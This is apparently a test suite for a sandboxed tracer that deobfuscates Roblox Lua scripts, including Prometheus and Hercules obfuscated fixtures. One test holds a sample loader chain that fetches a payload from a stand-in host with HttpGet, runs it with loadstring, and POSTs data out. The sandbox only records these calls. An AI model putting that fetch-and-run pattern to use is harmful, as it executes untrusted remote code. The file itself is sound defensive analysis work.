import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { bytesToBinary } from '../src/core/bytes.js';
import { traceScript } from '../src/trace/trace.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const corpus = path.join(here, 'corpus');
const read = (p) => bytesToBinary(fs.readFileSync(p));
const lines = (r) => r.script.split('\n').filter((l) => !l.startsWith('--') && l.trim()).map((l) => l.trim());

test('services, instances, properties and prints are listed in order', () => {
  const r = traceScript(`
    local Players = game:GetService("Players")
    local part = Instance.new("Part")
    part.Name = "Marker"
    part.Size = Vector3.new(1, 2, 3)
    part.Parent = workspace
    print("hi", part.Name)
  `);
  assert.equal(r.status, 'completed');
  assert.deepEqual(lines(r), [
    'game:GetService("Players")', // the result was never used, so it is a plain statement
    'local part = Instance.new("Part")',
    'part.Name = "Marker"',
    'part.Size = Vector3.new(1, 2, 3)',
    'part.Parent = workspace',
    'print("hi", "Marker")',
  ]);
});

test('network access is recorded, never performed, and a loader chain carries on', () => {
  const r = traceScript(`
    local body = game:HttpGet("https://example.invalid/payload.lua")
    local f = loadstring(body)
    f()
    request({ Url = "https://example.invalid/api", Method = "POST", Body = "x" })
  `);
  assert.equal(r.status, 'completed');
  assert.deepEqual(r.requests, ['https://example.invalid/payload.lua', 'https://example.invalid/api']);
  assert.equal(r.layers.length, 1);
  assert.match(r.layers[0].source, /no network in the sandbox/);
});

test('chunks built at run time are captured and traced', () => {
  const r = traceScript(`
    local code = string.char(112, 114, 105, 110, 116) .. '("decoded")'
    loadstring(code)()
  `);
  assert.equal(r.layers.length, 1);
  assert.equal(r.layers[0].source, 'print("decoded")');
  assert.equal(r.output, 'decoded\n');
});

test('event handlers are run once with stand-in arguments', () => {
  const r = traceScript(`
    local Players = game:GetService("Players")
    Players.PlayerAdded:Connect(function(plr)
      plr.Name = "x"
      print("joined")
    end)
  `);
  const text = r.script;
  assert.match(text, /PlayerAdded:Connect\(function\(\.\.\.\)/);
  assert.match(text, /arg1\.Name = "x"/);
  assert.equal(r.stats.handlers, 1);
});

test('infinite loops that wait are cut off by the wait budget, not the whole run', () => {
  const r = traceScript(`
    task.spawn(function() while true do task.wait(1) end end)
    print("main finished")
  `);
  assert.match(r.output, /main finished/);
  assert.equal(r.status, 'completed');
  assert.ok(r.stats.waits <= 100);
});

test('busy loops stop at the instruction limit and report it', () => {
  const r = traceScript('local n = 0 while true do n = n + 1 end', { fuel: 200_000 });
  assert.equal(r.status, 'limit');
  assert.match(r.ended, /fuel/);
});

test('executor functions exist and are real functions; unknown globals are reported, not invented', () => {
  const r = traceScript(`
    print(type(hookfunction), type(request), type(getgenv), type(syn), type(game), typeof(game))
    print(type(someMissingGlobal))
  `);
  assert.equal(r.output, 'function\tfunction\tfunction\ttable\tuserdata\tDataModel\nnil\n');
  assert.ok(r.undefinedGlobals.includes('someMissingGlobal'));
});

test('the script cannot reach anything outside the sandbox', () => {
  const r = traceScript(`
    print(type(process), type(globalThis), type(window), type(document), type(fetch), type(io), type(os.execute), type(package))
    local ok, err = pcall(function() return getfenv(0).process end)
    print(ok)
  `);
  assert.equal(r.output, 'nil\tnil\tnil\tnil\tnil\tnil\tnil\tnil\ntrue\n');
});

test('a script that does not parse is reported, not run', () => {
  const r = traceScript('local = =');
  assert.equal(r.status, 'syntax-error');
  assert.equal(r.ok, false);
});

test('output and events are bounded', () => {
  const r = traceScript('for i = 1, 100000 do print(i) end', { maxEvents: 500 });
  assert.equal(r.status, 'halted');
  assert.equal(r.stats.truncated, true);
  assert.ok(r.events.length <= 500);
});

// The headline claim: for every real Prometheus / Hercules fixture whose own output behaves like the original,
// the trace of the obfuscated script is the trace of the original, including virtual machines and bytecode.
test('traces of obfuscated fixtures equal the trace of the original program', () => {
  const key = (r) => r.events.filter((e) => e.kind !== 'load').map((e) => `${e.kind}:${e.text}`).join('\n');
  const base = new Map();
  for (const f of fs.readdirSync(path.join(corpus, 'originals')).filter((x) => x.endsWith('.lua'))) base.set(f, key(traceScript(read(path.join(corpus, 'originals', f)))));
  let checked = 0;
  const failures = [];
  for (const tool of ['prometheus', 'hercules']) {
    const manifest = JSON.parse(fs.readFileSync(path.join(corpus, 'obfuscated', tool, 'manifest.json'), 'utf8'));
    for (const e of manifest.entries) {
      if (e.status !== 'ok' || e.behavior !== 'equivalent') continue;
      checked++;
      const r = traceScript(read(path.join(corpus, 'obfuscated', tool, e.file)));
      if (key(r) !== base.get(e.sample)) failures.push(`${tool}/${e.file}: ${r.status} ${r.error || r.ended}`);
    }
  }
  assert.ok(checked >= 180, `only ${checked} fixtures were available`);
  assert.deepEqual(failures, []);
});
